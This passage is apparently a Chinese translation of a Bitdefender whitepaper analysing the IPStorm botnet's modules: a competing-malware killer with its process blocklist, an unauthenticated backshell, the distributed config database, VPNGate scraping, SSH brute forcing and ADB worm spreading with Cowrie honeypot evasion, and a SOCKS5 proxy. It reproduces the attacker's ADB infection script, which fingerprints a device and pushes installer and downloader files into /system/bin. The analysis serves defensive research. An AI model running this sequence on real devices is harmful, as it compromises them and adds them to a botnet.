    storm/malware-guard
    storm/node
    storm/powershell
    storm/proxy
    storm/reque_client
    storm/starter
    storm/statik
    storm/util
    storm/web_api_client
过去还有其他包，但已被替换或停止使用：
    storm/avbypass
    storm/bootstrap
    storm/handshake
    storm/identity
    storm/peers_cache
    storm/storm_runtime
    storm/vpngate
在本节中，我们将对包含其核心功能的模块进行技术分析。
#### 恶意软件卫士
此任务定期执行，查找竞争的恶意软件。如果进程的名称、可执行路径或命令行参数包含黑名单中的任何字符串，则认为进程可疑。进程被终止，它们的可执行文件被删除。黑名单上的字符串是：
    /data/local/tmp
    rig
    xig
    debug
    trinity
    xchecker
    zpyinstall
    startio
    startapp
    synctool
    ioservice
    start_
    com.ufo.miner
#### Backshell
此模块用于在受感染的设备上运行shell命令。shell是通过libp2p访问的协议连接（ID为/sbst/1.0.0）。该模块缺少身份验证或授权。
#### DDB
分布式数据库（DDB）被用来存储和共享配置数据。对于同步，每个Bot定期发布本地数据库中有关IPFS主题的条目。用更新的时间戳更新本地条目。在这个过程中，只有受信任的节点才有权更新某些密钥。libp2p（pubsub）实现消息签名，Bot检查公钥属于硬编码消息的可信密钥列表。
从相关主题检索到的DDB条目的示例如下：
    {
     “Command” : “SetWithTTL”,
     “Key” : “file-checksum/storm_android-amd64”,
     “Value” : “12c3368e17c04f49cfea139148b63fd1ab1a41e26c113991c2bb0835dd02495b”,
     “TTL” : 3600000000000,
     “T” : 1598897109
    }
该命令是指应该在数据库上执行的操作。在这种情况下，该项有一个时间tolive（TTL），这意味着它应该在发布后经过一个时间间隔（TTL值）后被丢弃。键和值与数据库中存储的实际数据相对应。
根据关键字，值具有以下含义：
数据库是一个关联数组，但是要区别于发表在这个主题上的（键，值）。Set和SetWithTTL命令存储与键相关联的值，替换前面的值。对于SAdd命令，与数据库中的键相关联的值是一个列表，消息中的值附加到该列表中。
虽然在最新的示例中，该模块仍用于本地存储，但同步机制已被使用webapi的管理节点查询所取代。
#### VPNGate
此模块用于对公共VPN服务VPNGate的API进行抓取。
程序执行一个请求`[http://www.vpngate.net/api/iphone/](http://www.vpngate.net/api/iphone/
"http://www.vpngate.net/api/iphone/")`并解析CSV响应。获得的关于这些VPN服务器的信息将发布在IPStorm的一个主题上。
将此模块包含在僵尸网络中的原因可能是为了克服限制为请求返回的服务器列表的VPNGate。通过僵尸网络以分布式方式抓取，可以发现更广泛的VPN服务器选择。
#### Reque
reque包（可能代表来自“command-and-control”的请求”）用于与SSH和ADB服务器的协同扫描以及蠕虫式感染相关的功能。Bot通过/sreque/1.0.0协议连接到一个称为请求服务器的IPFS节点。来自此服务器的命令分布在一个工作队列中。该模块设计为易于扩展以处理新命令。目前，有两个命令处理程序，分别用于tcp
scan和brute ssh命令。
tcp-scan命令用于扫描一组端口上的IP范围。如果目标端口列表包含端口22或5555，则模块将分别遵循SSH和ADB协议。
brute-ssh的一个参数和一个地址列表作为其参数。如果Bot成功地在目标设备上获得shell，它就会执行感染有效载荷，将受害者变成IPStorm
Bot。
作为一种[蜜罐规避](https://github.com/cowrie/cowrie
"蜜罐规避")技术，在感染前使用正则表达式验证shell的提示步骤。regex匹配“svr04”字符串，它是Cowrie蜜罐的主机名。
在SSH的情况下，Bot表现出蠕虫行为，而对于ADB，感染阶段不是由Bot执行的，Bot只将找到的关于设备的信息中继回reque
manager。实际的感染是由一个bot-herder控制的节点执行的，该节点通过ADB连接到受害者并发出感染有效载荷。根据我们从ADB蜜罐收集的数据，攻击者的脚本相当于：
    adb connect $IP:5555
    adb root && adb wait-for-device
    adb remount && adb wait-for-device
    adb shell mount -o rw,remount /data; mount -o rw,remount /system; mount -o rw,remount /
    adb shell echo “{
     \”user\”:\”$(whoami 2>/dev/null)\”,
     \”id\”:\”$(id 2>/dev/null)\”,
     \”root_access\”:\”$(getprop persist.sys.root_access 2>/dev/null)\”,
     \”machine\”:\”$(uname -m 2>/dev/null)\”,
     \”curl\”:\”$(which curl 2>/dev/null)\”,
     \”wget\”:\”$(which wget 2>/dev/null)\”,
     \”adb\”:\”$(which adb 2>/dev/null)\”,
     \”iptables\”:\”$(which iptables 2>/dev/null)\”,
     \”ipset\”:\”$(which ipset 2>/dev/null)\”,
     \”abi\”:\”$(getprop ro.product.cpu.abi 2>/dev/null)\”,
     \”abi2\”:\”$(getprop ro.product.cpu.abi2 2>/dev/null)\”,
     \”abilist\”:\”$(getprop ro.product.cpu.abilist 2>/dev/null)\”,
     \”abilist32\”:\”$(getprop ro.product.cpu.abilist32 2>/dev/null)\”,
     \”abilist64\”:\”$(getprop ro.product.cpu.abilist64 2>/dev/null)\”,
     \”sdk\”:\”$(getprop ro.build.version.sdk 2>/dev/null)\”
    Bitdefender DracoTeam • WHITEPAPER
    Looking Into the Eye of the Interplanetary Storm
    }”
    adb push install-recovery.sh /system/bin/install-recovery.sh
    adb push storm-install.sh /system/bin/storm-install.sh
    adb push sldrgo /system/bin/sldrgo
通过echo命令收集的指纹信息用于调整剩余的有效载荷。最后的文件sldrgo是为受害者的CPU架构编译的UPX压缩二进制文件。它的目的是下载主Bot有效载荷。
#### Proxy
IPStorm代理通过libp2p流量对[SOCKS5](https://github.com/armon/go-socks5
"SOCKS5")协议进行隧道传输。该模块同时执行两个任务：维护与后端的连接和处理传入流。
代理后端使用DDB（旧版本）或节点发现机制定位。然后，bot使用/sbpcp/1.0.0协议连接到后端，并定期使用其外部IP地址和延迟。
在初始化阶段，它使用开源的SOCKS5实现在随机端口上启动本地SOCKS5代理。实例化了/sbptp/1.0.0协议的流处理程序。这允许节点从libp2p流中取消封装SOCKS5代理流量，并将其转发给本地代理。同样，响应通过libp2p流转发回对等端。在旧版本中，这是使用双向管道的特殊实现来完成的：
    type proxy.BidirectionalPipe struct{
     ctx context.Context
     lrw io.ReadWriter
     rrw io.ReadWriter
     pipe1 *proxy.Pipe
     pipe2 *proxy.Pipe
    }
    type proxy.Pipe struct{